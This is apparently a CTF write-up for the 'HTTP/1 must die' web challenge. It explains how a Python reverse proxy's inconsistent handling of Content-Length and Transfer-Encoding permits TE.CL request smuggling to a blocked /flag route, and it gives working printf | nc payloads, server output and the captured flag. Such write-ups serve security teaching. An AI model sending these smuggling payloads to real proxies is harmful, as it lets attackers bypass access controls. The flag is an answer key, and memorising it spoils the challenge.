---
layout: post
title: "Platypwn – HTTP/1 must die"
date: 2025-11-16 09:31 +0300
categories: [Write-ups, web]
tags: [CTF, Platypwn, Web]
toc: true
pin: false
description: |-
  I had some free time and started building a little reverse proxy in python, just for the fun of it. But man HTTP/1 is weird. Anyway, I think my proxy mostly works and it allowed me to skip implementing authentication on my server cause I can just block routes there. Pretty cool, no?

image: /assets/img/categories/web.svg
---


# HTTP/1 must die

> **Category:** Web  
> **Prompt:** I had some free time and started building a little reverse proxy in python, just for the fun of it. But man HTTP/1 is weird. Anyway, I think my proxy mostly works and it allowed me to skip implementing authentication on my server cause I can just block routes there. Pretty cool, no?

> **Artifact:** [⬇️ web.http1mustdie.zip](/assets/file/writeup/HTTP-1-must-die/web.http1mustdie.zip?raw=1)  
> **Flag format:** `PP{...}`

---

## Intro

This challenge is about **HTTP/1.1 parsing mismatches** in a hand‑rolled Python reverse proxy sitting in front of a Go backend. The author tried to “block” sensitive routes at the proxy (e.g., `/flag`) instead of implementing backend auth. Classic foot‑gun: a proxy that inspects only the request start‑line is vulnerable to **HTTP request smuggling / desync**.

---

## Challenge Description

- **Topology:** Client → Python reverse proxy → Go `net/http` backend  
- **Backend behavior:** `GET /flag` returns the flag from the `FLAG` environment variable.  
- **Proxy behavior:** Deny if the **request target** (after a single `unquote`) contains the substring `flag`.  
- **Assumption:** The proxy is not a fully compliant HTTP/1 proxy; it re‑emits requests with modified hop‑by‑hop headers and has inconsistent handling of `Transfer-Encoding` and `Content-Length`.

Observed locally / from the artifact:
- Absolute‑form request targets (e.g., `GET http://x/flag HTTP/1.1`) are recognized and blocked with **403** (`"My flag, not yours!"`).  
- Extra-space tricks (e.g., `GET␠␠/flag`) are rejected with **400**.  
- A **TE.CL** parser mismatch enables request smuggling to reach `/flag` anyway.

---

## Exploit Strategy

Use a **TE.CL desynchronization** (aka “request smuggling”):

1. Send a `POST` with **both** `Content-Length` and `Transfer-Encoding: chunked`.  
2. Craft the **chunk payload** to be a complete second HTTP request (`GET /flag HTTP/1.1\r\nHost: a\r\n\r\n`).  
3. Set `Content-Length: 4` and use a first chunk size of `1f` (hex **31**) which equals the length of the smuggled request line+headers.  
4. The proxy honors `Transfer-Encoding` when reading from the client, but when it forwards to the backend it **drops `Transfer-Encoding`** and **keeps `Content-Length`** intact—forwarding the raw chunk bytes.  
5. The backend (Go) obeys `Content-Length: 4`, consumes only `1f\r\n` as the POST body, then immediately reads the next bytes as a **new request**: our smuggled `GET /flag`.

Why it bypasses the filter: the proxy’s “flag” check inspects only the **outer** request start‑line, not the **inner** smuggled one.

---

## Steps

1. **Probe absolute‑form:**  
   ```bash
   printf 'GET http://ignored/flag HTTP/1.1
   Host: anything
   Connection: close

   ' | nc 127.0.0.1 8000

   ```
   
   → **403 Forbidden** (`My flag, not yours!`) — confirms substring blocking of `flag`.

2. **Try extra spacing:**  
   ```bash
   printf 'GET  /flag HTTP/1.1
   Host: anything
   Connection: close

   ' | nc 127.0.0.1 8000
   ```
   → **400 Bad Request** — proxy/backend reject malformed spacing here.

3. **Smuggle via TE.CL:**  
   The smuggled request is `GET /flag HTTP/1.1
   Host: a

   ` (length = **31 = 0x1f**).  
   Send this single‑packet payload:
   ```bash
   printf 'POST / HTTP/1.1
   Host: anything
   Content-Length: 4
   Transfer-Encoding: chunked
   Connection: keep-alive

   1f
   GET /flag HTTP/1.1
   Host: a


   0

   ' | nc 127.0.0.1 8000
   ```
   Expected responses (pipelined):
   - 200 OK for the decoy `POST /` (Gandalf quote body).
   - 200 OK for the **smuggled** `GET /flag` containing the flag.
   - A trailing **400** is normal as the connection desyncs.

---

## Solver

```bash

printf 'POST / HTTP/1.1\r\nHost: anything\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n1f\r\nGET /flag HTTP/1.1\r\nHost: a\r\n\r\n\r\n0\r\n\r\n' \
| nc 10.80.17.68 8000

```

---

## Output:
```text
HTTP/1.1 200 OK
Content-Length: 189
Content-Type: text/plain; charset=utf-8

You cannot pass. I am a servant of the secret fire, wielder of the flame of Anor. Your dark magic will not avail you, flame of Udûn. This flag stands under my protection! You cannot pass.
HTTP/1.1 200 OK
Content-Length: 50
Content-Type: text/plain; charset=utf-8

PP{why_4r3_th3r3_2_l3ngth_h34d3rs?::heqkf3qLeo-N}
HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close

400 Bad Request
```

FLAG: PP{why_4r3_th3r3_2_l3ngth_h34d3rs?::heqkf3qLeo-N}


---
